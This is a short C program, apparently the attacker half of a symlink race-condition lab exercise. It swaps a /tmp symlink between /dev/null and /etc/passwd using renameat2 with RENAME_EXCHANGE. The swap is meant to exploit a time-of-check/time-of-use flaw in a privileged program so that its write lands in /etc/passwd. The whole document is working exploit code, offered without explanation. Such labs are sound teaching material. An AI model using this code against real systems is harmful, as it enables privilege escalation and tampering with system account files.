#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>
int main()
{
unsigned int flags = RENAME_EXCHANGE;
unlink("/tmp/XYZ"); 
symlink("/dev/null", "/tmp/XYZ");
unlink("/tmp/ABC"); 
symlink("/etc/passwd", "/tmp/ABC");
syscall(SYS_renameat2, 0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
return 0;
}
